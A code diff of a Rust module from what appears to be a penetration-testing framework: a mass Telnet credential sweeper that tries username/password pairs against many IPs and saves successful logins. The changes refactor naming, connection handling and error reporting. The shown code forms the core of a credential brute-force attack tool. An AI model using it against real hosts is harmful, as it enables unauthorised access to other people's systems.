@@ -2,10 +2,9 @@ use anyhow::Result;
 use std::net::SocketAddr;
 use std::time::{Duration, Instant};
 use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
-use tokio::net::TcpStream;
 use tokio::time::timeout;
 
-use crate::modules::creds::utils::{run_mass_scan, MassScanConfig};
+use crate::utils::{run_mass_scan, MassScanConfig};
 use crate::utils::{cfg_prompt_output_file, cfg_prompt_yes_no};
 
 use colored::*;
@@ -113,7 +112,7 @@ pub async fn run(target: &str) -> Result<()> {
             cfg_prompt_output_file(
                 "results_file",
                 "Results output file",
-                "telnet_hose_creds.txt",
+                "telnet_sweep_creds.txt",
             )
             .await?,
         )
@@ -130,8 +129,8 @@ pub async fn run(target: &str) -> Result<()> {
         MassScanConfig {
             protocol_name: "Telnet-Hose",
             default_port: 23,
-            state_file: "telnet_hose_state.log",
-            default_output: "telnet_hose_results.txt",
+            state_file: "telnet_sweep_state.log",
+            default_output: "telnet_sweep_results.txt",
             default_concurrency: 500,
         },
         move |ip, port| {
@@ -188,16 +187,19 @@ pub async fn run(target: &str) -> Result<()> {
                             let line = format!("[{}] {}:{}:{}:{}\n", ts, ip, p, user, pass);
 
                             // Store credential in framework credential store
-                            let _ = crate::cred_store::store_credential(
-                                &ip.to_string(),
-                                p,
-                                "telnet",
-                                user,
-                                pass,
-                                crate::cred_store::CredType::Password,
-                                "creds/generic/telnet_hose",
-                            )
-                            .await;
+                            {
+                                let id = crate::cred_store::store_credential(
+                                    &ip.to_string(),
+                                    p,
+                                    "telnet",
+                                    user,
+                                    pass,
+                                    crate::cred_store::CredType::Password,
+                                    "creds/generic/telnet_sweep",
+                                )
+                                .await;
+                                if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
+                            }
 
                             // Save to dedicated results file if requested
                             if let Some(ref path) = rf {
@@ -206,7 +208,7 @@ pub async fn run(target: &str) -> Result<()> {
                                 opts.create(true).append(true);
                                 opts.mode(0o600);
                                 if let Ok(mut f) = opts.open(path) {
-                                    let _ = std::io::Write::write_all(&mut f, line.as_bytes());
+                                    if let Err(e) = std::io::Write::write_all(&mut f, line.as_bytes()) { crate::meprintln!("[!] Results file write error: {}", e); }
                                 }
                             }
 
@@ -255,14 +257,8 @@ async fn do_telnet_session(
 ) -> Result<(bool, bool)> {
     // returns (success, banner_detected)
 
-    let stream_res = timeout(
-        Duration::from_millis(CONNECT_TIMEOUT_MS),
-        TcpStream::connect(socket),
-    )
-    .await;
-
-    let stream = match stream_res {
-        Ok(Ok(s)) => s,
+    let stream = match crate::utils::network::tcp_connect_addr(*socket, Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
+        Ok(s) => s,
         _ => return Ok((false, false)), // Connect fail
     };
 
@@ -372,21 +368,21 @@ async fn do_telnet_session(
         // Perform Writes if needed
         match state {
             TelnetState::SendingUsername => {
-                let _ = writer
+                if let Err(e) = writer
                     .write_all(format!("{}\r\n", username).as_bytes())
-                    .await;
+                    .await { crate::meprintln!("[!] Write error: {}", e); }
                 // Add requested 2s delay
                 tokio::time::sleep(Duration::from_secs(2)).await;
                 state = TelnetState::WaitingForPasswordPrompt;
             }
             TelnetState::SendingPassword => {
-                let _ = writer
+                if let Err(e) = writer
                     .write_all(format!("{}\r\n", password).as_bytes())
-                    .await;
+                    .await { crate::meprintln!("[!] Write error: {}", e); }
                 state = TelnetState::WaitingForResult;
             }
             TelnetState::SendingHelp => {
-                let _ = writer.write_all(b"help\r\n").await;
+                if let Err(e) = writer.write_all(b"help\r\n").await { crate::meprintln!("[!] Write error: {}", e); }
                 state = TelnetState::WaitingForHelpResponse;
             }
             _ => {}
